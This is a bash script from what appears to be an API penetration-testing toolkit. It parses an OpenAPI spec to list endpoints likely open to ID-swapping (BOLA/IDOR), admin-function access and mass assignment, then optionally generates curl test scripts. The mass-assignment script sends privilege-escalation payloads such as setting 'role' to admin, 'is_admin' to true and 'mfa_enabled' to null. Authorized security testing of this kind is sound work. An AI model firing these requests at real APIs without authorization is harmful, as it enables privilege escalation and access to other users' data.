#!/usr/bin/env bash
# =============================================================================
# spec-analyzer.sh - OpenAPI/Swagger Specification Security Analyzer
# =============================================================================
# Parses an OpenAPI spec and auto-generates test matrices for:
#   - BOLA/IDOR candidates (endpoints with object ID parameters)
#   - BFLA candidates (admin/internal endpoints)
#   - Mass assignment targets (readOnly fields, undocumented properties)
#   - Input validation test cases (boundary values, type confusion)
#   - Missing authentication endpoints
#   - Deprecated but accessible endpoints
#
# Usage:
#   ./spec-analyzer.sh <spec-url-or-file> [options]
#
# Options:
#   --token <token>      Bearer token for authenticated spec download
#   --output-dir <dir>   Output directory (default: reports/rest-api/spec)
#   --generate-scripts   Generate executable test scripts from matrices
#   --target <base-url>  Target base URL (overrides servers[] in spec)
#   --format <fmt>       Output format: md|json|both (default: both)
#
# Requirements: jq, curl
# =============================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

usage() {
  echo "Usage: $0 <spec-url-or-file> [options]"
  echo ""
  echo "Options:"
  echo "  --token <token>       Bearer token for authenticated spec download"
  echo "  --output-dir <dir>    Output directory (default: reports/rest-api/spec)"
  echo "  --generate-scripts    Generate executable test scripts from matrices"
  echo "  --target <base-url>   Target base URL (overrides servers[] in spec)"
  echo "  --format <fmt>        Output format: md|json|both (default: both)"
  exit 1
}

log() { echo -e "${CYAN}[SPEC-ANALYZER]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }

# ---- Argument Parsing ----
SPEC_SOURCE="${1:-}"
[ -z "$SPEC_SOURCE" ] && usage

shift
TOKEN=""
OUT_DIR="reports/rest-api/spec"
GEN_SCRIPTS=false
TARGET_BASE=""
FORMAT="both"

while [[ $# -gt 0 ]]; do
  case $1 in
    --token) TOKEN="$2"; shift 2 ;;
    --output-dir) OUT_DIR="$2"; shift 2 ;;
    --generate-scripts) GEN_SCRIPTS=true; shift ;;
    --target) TARGET_BASE="$2"; shift 2 ;;
    --format) FORMAT="$2"; shift 2 ;;
    *) error "Unknown option: $1"; usage ;;
  esac
done

mkdir -p "$OUT_DIR"
SPEC_FILE="$OUT_DIR/spec.json"

# ---- Dependency Check ----
for cmd in jq curl; do
  command -v "$cmd" >/dev/null 2>&1 || { error "$cmd is required but not installed."; exit 1; }
done

# ---- Step 1: Obtain Specification ----
log "Step 1: Obtaining OpenAPI specification..."

if [[ -f "$SPEC_SOURCE" ]]; then
  log "Reading from local file: $SPEC_SOURCE"
  if [[ "$SPEC_SOURCE" == *.yaml ]] || [[ "$SPEC_SOURCE" == *.yml ]]; then
    if command -v yq >/dev/null 2>&1; then
      yq -o=json "$SPEC_SOURCE" > "$SPEC_FILE"
    else
      warn "yq not found - cannot convert YAML. Install yq or provide JSON spec."
      cp "$SPEC_SOURCE" "$SPEC_FILE"
    fi
  else
    jq . "$SPEC_SOURCE" > "$SPEC_FILE" 2>/dev/null || cp "$SPEC_SOURCE" "$SPEC_FILE"
  fi
else
  log "Downloading from URL: $SPEC_SOURCE"
  # The spec download is the one request that leaves for the target. Route it through the program's
  # egress proxy (roe.json "proxy" / GRIMNIR_PROXY, exported by the calling harness); curl rides the
  # exported ALL_PROXY. An unusable proxy refuses (exit 4). A local-file spec (the if-branch above)
  # makes no request, so offline analysis is never gated. No project dir here -> GRIMNIR_PROXY only.
  source "$(dirname "${BASH_SOURCE[0]}")/../../scripts/egress-env.sh"
  egress_init "" || exit 4
  CURL_AUTH=()
  [ -n "$TOKEN" ] && CURL_AUTH=(-H "Authorization: Bearer $TOKEN")
  curl -s "${CURL_AUTH[@]}" "$SPEC_SOURCE" | jq . > "$SPEC_FILE" 2>/dev/null
  if [ ! -s "$SPEC_FILE" ]; then
    error "Failed to download or parse spec from $SPEC_SOURCE"
    exit 1
  fi
fi

# Detect spec version
SPEC_VERSION=$(jq -r '.openapi // .swagger // "unknown"' "$SPEC_FILE")
log "Spec version detected: $SPEC_VERSION"

# Extract base URL from spec if not provided
if [ -z "$TARGET_BASE" ]; then
  TARGET_BASE=$(jq -r '(.servers[0].url // .host // "https://TARGET") | rtrimstr("/")' "$SPEC_FILE")
  log "Target base URL from spec: $TARGET_BASE"
fi

# ---- Step 2: Endpoint Inventory ----
log "Step 2: Extracting endpoint inventory..."

jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.key | test("^(get|post|put|patch|delete|head|options)$")) |
  "\(.key | ascii_upcase) \($path)"' "$SPEC_FILE" | sort > "$OUT_DIR/all-endpoints.txt"

TOTAL_ENDPOINTS=$(wc -l < "$OUT_DIR/all-endpoints.txt")
success "Found $TOTAL_ENDPOINTS endpoint-method combinations"

# ---- Step 3: BOLA/IDOR Candidates ----
log "Step 3: Identifying BOLA/IDOR candidates..."

grep -E '\{[^}]+\}' "$OUT_DIR/all-endpoints.txt" > "$OUT_DIR/bola-candidates.txt" 2>/dev/null || true
BOLA_COUNT=$(wc -l < "$OUT_DIR/bola-candidates.txt")
success "Found $BOLA_COUNT BOLA candidate endpoints (contain path parameters)"

# ---- Step 4: Admin/Internal Endpoints (BFLA) ----
log "Step 4: Identifying admin/internal endpoints (BFLA candidates)..."

grep -iE '(admin|internal|debug|manage|config|secret|private|system|superuser|staff|moderate|dashboard|backoffice|ops)'   "$OUT_DIR/all-endpoints.txt" > "$OUT_DIR/bfla-candidates.txt" 2>/dev/null || true
BFLA_COUNT=$(wc -l < "$OUT_DIR/bfla-candidates.txt")
success "Found $BFLA_COUNT BFLA candidate endpoints (admin/internal paths)"

# ---- Step 5: Unauthenticated Endpoints ----
log "Step 5: Finding endpoints without authentication requirements..."

jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.key | test("^(get|post|put|patch|delete)$")) |
  select(
    (.value.security == []) or
    (.value.security == null and (input_line_number > 0))
  ) |
  "\(.key | ascii_upcase) \($path)"' "$SPEC_FILE" > "$OUT_DIR/no-auth-endpoints.txt" 2>/dev/null || true

# Also check if global security is defined
GLOBAL_SECURITY=$(jq -r '.security // "none"' "$SPEC_FILE")
if [ "$GLOBAL_SECURITY" = "none" ] || [ "$GLOBAL_SECURITY" = "null" ]; then
  warn "No global security defined - all endpoints may lack auth requirements"
fi

NOAUTH_COUNT=$(wc -l < "$OUT_DIR/no-auth-endpoints.txt")
success "Found $NOAUTH_COUNT endpoints with potentially missing auth"

# ---- Step 6: Deprecated Endpoints ----
log "Step 6: Finding deprecated but accessible endpoints..."

jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.value.deprecated == true) |
  "\(.key | ascii_upcase) \($path)"' "$SPEC_FILE" > "$OUT_DIR/deprecated-endpoints.txt" 2>/dev/null || true
DEPR_COUNT=$(wc -l < "$OUT_DIR/deprecated-endpoints.txt")
success "Found $DEPR_COUNT deprecated endpoints"

# ---- Step 7: Mass Assignment Analysis ----
log "Step 7: Analyzing schemas for mass assignment targets..."

# Extract writable endpoints (POST/PUT/PATCH)
grep -E '^(POST|PUT|PATCH)' "$OUT_DIR/all-endpoints.txt" > "$OUT_DIR/writable-endpoints.txt" 2>/dev/null || true
WRITABLE_COUNT=$(wc -l < "$OUT_DIR/writable-endpoints.txt")

# Find readOnly properties in schemas
jq -r '
  [.. | objects | to_entries[] | select(.value | type == "object" and .readOnly == true) | .key] |
  unique | .[]
' "$SPEC_FILE" > "$OUT_DIR/readonly-fields.txt" 2>/dev/null || true

# Find all schema properties for diffing
jq -r '
  [.. | objects | select(has("properties")) | .properties | keys[]] | unique | .[]
' "$SPEC_FILE" > "$OUT_DIR/all-schema-fields.txt" 2>/dev/null || true

READONLY_COUNT=$(wc -l < "$OUT_DIR/readonly-fields.txt")
FIELD_COUNT=$(wc -l < "$OUT_DIR/all-schema-fields.txt")
success "Found $WRITABLE_COUNT writable endpoints, $READONLY_COUNT readOnly fields, $FIELD_COUNT total schema fields"

# ---- Step 8: Parameter Inventory ----
log "Step 8: Building parameter inventory..."

jq -r '
  .paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.key | test("^(get|post|put|patch|delete)$")) |
  .key as $method |
  (.value.parameters // [])[] |
  "\($method | ascii_upcase) \($path) | \(.in): \(.name) (\(.schema.type // "unknown")) \(if .required then "[REQUIRED]" else "[optional]" end)"
' "$SPEC_FILE" > "$OUT_DIR/parameter-inventory.txt" 2>/dev/null || true
PARAM_COUNT=$(wc -l < "$OUT_DIR/parameter-inventory.txt")
success "Cataloged $PARAM_COUNT parameters across all endpoints"

# ---- Step 9: Security Schemes ----
log "Step 9: Analyzing authentication/security schemes..."

jq -r '
  (.securityDefinitions // .components.securitySchemes // {}) | to_entries[] |
  "Scheme: \(.key) | Type: \(.value.type) | In: \(.value.in // "n/a") | Flow: \(.value.flows // .value.flow // "n/a")"
' "$SPEC_FILE" > "$OUT_DIR/security-schemes.txt" 2>/dev/null || true
cat "$OUT_DIR/security-schemes.txt" 2>/dev/null | while read line; do
  success "$line"
done

# ---- Step 10: Generate Summary Report ----
log "Step 10: Generating analysis report..."

if [ "$FORMAT" = "md" ] || [ "$FORMAT" = "both" ]; then
cat > "$OUT_DIR/analysis-report.md" << MDEOF
# OpenAPI Spec Security Analysis

**Spec Source**: $SPEC_SOURCE
**Spec Version**: $SPEC_VERSION
**Target Base**: $TARGET_BASE
**Analysis Date**: $(date -u +"%Y-%m-%d %H:%M:%S UTC")

## Summary

| Category | Count | Risk |
|----------|-------|------|
| Total Endpoints | $TOTAL_ENDPOINTS | - |
| BOLA Candidates (path params) | $BOLA_COUNT | High |
| BFLA Candidates (admin paths) | $BFLA_COUNT | High |
| No-Auth Endpoints | $NOAUTH_COUNT | Critical |
| Deprecated Endpoints | $DEPR_COUNT | Medium |
| Writable Endpoints | $WRITABLE_COUNT | Medium |
| ReadOnly Fields (mass assignment) | $READONLY_COUNT | High |
| Total Schema Fields | $FIELD_COUNT | - |
| Total Parameters | $PARAM_COUNT | - |

## BOLA/IDOR Candidates
Test these endpoints by swapping object IDs between two user sessions.

\`\`\`
$(cat "$OUT_DIR/bola-candidates.txt" 2>/dev/null || echo "None found")
\`\`\`

## BFLA Candidates (Admin/Internal)
Test these endpoints with low-privilege user tokens.

\`\`\`
$(cat "$OUT_DIR/bfla-candidates.txt" 2>/dev/null || echo "None found")
\`\`\`

## Endpoints Without Authentication
These may be accessible without any credentials.

\`\`\`
$(cat "$OUT_DIR/no-auth-endpoints.txt" 2>/dev/null || echo "None found or global security applies")
\`\`\`

## Deprecated Endpoints
May lack modern security controls. Test for vulns patched in current version.

\`\`\`
$(cat "$OUT_DIR/deprecated-endpoints.txt" 2>/dev/null || echo "None found")
\`\`\`

## ReadOnly Fields (Mass Assignment Targets)
Attempt to write these fields via PUT/PATCH on writable endpoints.

\`\`\`
$(cat "$OUT_DIR/readonly-fields.txt" 2>/dev/null || echo "None found")
\`\`\`

## Security Schemes
\`\`\`
$(cat "$OUT_DIR/security-schemes.txt" 2>/dev/null || echo "None defined")
\`\`\`

## Next Steps
1. Run BOLA tests: swap IDs in all $BOLA_COUNT candidate endpoints
2. Run BFLA tests: access $BFLA_COUNT admin endpoints with regular user tokens
3. Test $NOAUTH_COUNT unauthenticated endpoints for sensitive data exposure
4. Attempt mass assignment on $WRITABLE_COUNT writable endpoints using $READONLY_COUNT readOnly fields
5. Test $DEPR_COUNT deprecated endpoints for unpatched vulnerabilities
MDEOF
success "Markdown report: $OUT_DIR/analysis-report.md"
fi

if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "both" ]; then
jq -n \
  --arg spec_source "$SPEC_SOURCE" \
  --arg spec_version "$SPEC_VERSION" \
  --arg target_base "$TARGET_BASE" \
  --arg date "$(date -u +"%Y-%m-%dT%H:%M:%SZ")" \
  --argjson total "$TOTAL_ENDPOINTS" \
  --argjson bola "$BOLA_COUNT" \
  --argjson bfla "$BFLA_COUNT" \
  --argjson noauth "$NOAUTH_COUNT" \
  --argjson deprecated "$DEPR_COUNT" \
  --argjson writable "$WRITABLE_COUNT" \
  --argjson readonly_fields "$READONLY_COUNT" \
  '{
    spec_source: $spec_source,
    spec_version: $spec_version,
    target_base: $target_base,
    analyzed_at: $date,
    summary: {
      total_endpoints: $total,
      bola_candidates: $bola,
      bfla_candidates: $bfla,
      no_auth_endpoints: $noauth,
      deprecated_endpoints: $deprecated,
      writable_endpoints: $writable,
      readonly_fields: $readonly_fields
    }
  }' > "$OUT_DIR/analysis-summary.json"
success "JSON summary: $OUT_DIR/analysis-summary.json"
fi

# ---- Step 11: Generate Test Scripts (optional) ----
if [ "$GEN_SCRIPTS" = true ]; then
  log "Step 11: Generating executable test scripts..."
  SCRIPTS_DIR="$OUT_DIR/generated-scripts"
  mkdir -p "$SCRIPTS_DIR"

  # BOLA test script
  cat > "$SCRIPTS_DIR/test-bola.sh" << 'BOLASCRIPT'
#!/usr/bin/env bash
# Auto-generated BOLA test script
# Usage: ./test-bola.sh <base-url> <token-user-a> <token-user-b> <id-user-a> <id-user-b>
set -euo pipefail
BASE="${1:?Usage: $0 <base-url> <token-a> <token-b> <id-a> <id-b>}"
TOKEN_A="${2:?}"; TOKEN_B="${3:?}"; ID_A="${4:?}"; ID_B="${5:?}"
echo "=== BOLA Testing: $BASE ==="
echo "User A ID: $ID_A | User B ID: $ID_B"
echo ""
BOLASCRIPT

  while IFS= read -r line; do
    method=$(echo "$line" | awk '{print $1}')
    path=$(echo "$line" | awk '{print $2}')
    test_path_a=$(echo "$path" | sed 's/{[^}]*}/$ID_A/g')
    test_path_b=$(echo "$path" | sed 's/{[^}]*}/$ID_B/g')
    cat >> "$SCRIPTS_DIR/test-bola.sh" << BOLA_ENTRY
# Test: $method $path
echo -n "BOLA $method $path (B->A): "
code=\$(curl -s -o /dev/null -w "%{http_code}" -X $method "\${BASE}${test_path_a}" \
  -H "Authorization: Bearer \$TOKEN_B" -H "Content-Type: application/json")
[ "\$code" = "200" ] && echo "VULNERABLE (\$code)" || echo "OK (\$code)"
BOLA_ENTRY
  done < "$OUT_DIR/bola-candidates.txt"

  chmod +x "$SCRIPTS_DIR/test-bola.sh"
  success "Generated: $SCRIPTS_DIR/test-bola.sh"

  # BFLA test script
  cat > "$SCRIPTS_DIR/test-bfla.sh" << 'BFLASCRIPT'
#!/usr/bin/env bash
# Auto-generated BFLA test script
# Usage: ./test-bfla.sh <base-url> <regular-user-token>
set -euo pipefail
BASE="${1:?Usage: $0 <base-url> <regular-user-token>}"
TOKEN="${2:?}"
echo "=== BFLA Testing: $BASE ==="
echo "Testing admin endpoints with regular user token"
echo ""
BFLASCRIPT

  while IFS= read -r line; do
    method=$(echo "$line" | awk '{print $1}')
    path=$(echo "$line" | awk '{print $2}')
    cat >> "$SCRIPTS_DIR/test-bfla.sh" << BFLA_ENTRY
echo -n "BFLA $method $path: "
code=\$(curl -s -o /dev/null -w "%{http_code}" -X $method "\${BASE}${path}" \
  -H "Authorization: Bearer \$TOKEN" -H "Content-Type: application/json")
[ "\$code" = "200" ] && echo "ACCESSIBLE (\$code)" || echo "Blocked (\$code)"
BFLA_ENTRY
  done < "$OUT_DIR/bfla-candidates.txt"

  chmod +x "$SCRIPTS_DIR/test-bfla.sh"
  success "Generated: $SCRIPTS_DIR/test-bfla.sh"

  # Mass assignment test script
  cat > "$SCRIPTS_DIR/test-mass-assignment.sh" << 'MASSSCRIPT'
#!/usr/bin/env bash
# Auto-generated mass assignment test script
# Usage: ./test-mass-assignment.sh <base-url> <token>
set -euo pipefail
BASE="${1:?Usage: $0 <base-url> <token>}"
TOKEN="${2:?}"
echo "=== Mass Assignment Testing: $BASE ==="
echo ""
MASSSCRIPT

  while IFS= read -r line; do
    method=$(echo "$line" | awk '{print $1}')
    path=$(echo "$line" | awk '{print $2}')
    cat >> "$SCRIPTS_DIR/test-mass-assignment.sh" << MASS_ENTRY
echo "--- $method $path ---"
echo -n "  PUT with privesc fields: "
code=\$(curl -s -o /tmp/mass-resp.json -w "%{http_code}" -X PUT "\${BASE}${path}" \
  -H "Authorization: Bearer \$TOKEN" -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"verified":true,"credits":999999}')
echo "\$code"; [ "\$code" = "200" ] && echo "  Response:" && jq . /tmp/mass-resp.json 2>/dev/null | head -10

echo -n "  PATCH with privesc fields: "
code=\$(curl -s -o /tmp/mass-resp.json -w "%{http_code}" -X PATCH "\${BASE}${path}" \
  -H "Authorization: Bearer \$TOKEN" -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"verified":true}')
echo "\$code"; [ "\$code" = "200" ] && echo "  Response:" && jq . /tmp/mass-resp.json 2>/dev/null | head -10

echo -n "  JSON Patch (RFC 6902): "
code=\$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "\${BASE}${path}" \
  -H "Authorization: Bearer \$TOKEN" -H "Content-Type: application/json-patch+json" \
  -d '[{"op":"replace","path":"/role","value":"admin"}]')
echo "\$code"

echo -n "  Merge Patch null-delete (RFC 7396): "
code=\$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "\${BASE}${path}" \
  -H "Authorization: Bearer \$TOKEN" -H "Content-Type: application/merge-patch+json" \
  -d '{"mfa_enabled":null,"password_reset_required":null}')
echo "\$code"
echo ""
MASS_ENTRY
  done < "$OUT_DIR/writable-endpoints.txt"

  chmod +x "$SCRIPTS_DIR/test-mass-assignment.sh"
  success "Generated: $SCRIPTS_DIR/test-mass-assignment.sh"
fi

# ---- Final Summary ----
echo ""
echo -e "${BOLD}================================================================${NC}"
echo -e "${BOLD} Spec Analysis Complete${NC}"
echo -e "${BOLD}================================================================${NC}"
echo -e " Spec:       $SPEC_SOURCE ($SPEC_VERSION)"
echo -e " Target:     $TARGET_BASE"
echo -e " Endpoints:  ${GREEN}$TOTAL_ENDPOINTS${NC} total"
echo -e " BOLA:       ${RED}$BOLA_COUNT${NC} candidates"
echo -e " BFLA:       ${RED}$BFLA_COUNT${NC} candidates"
echo -e " No Auth:    ${RED}$NOAUTH_COUNT${NC} endpoints"
echo -e " Deprecated: ${YELLOW}$DEPR_COUNT${NC} endpoints"
echo -e " Writable:   ${YELLOW}$WRITABLE_COUNT${NC} endpoints"
echo -e " ReadOnly:   ${RED}$READONLY_COUNT${NC} mass assignment targets"
echo -e " Output:     $OUT_DIR/"
echo -e "${BOLD}================================================================${NC}"
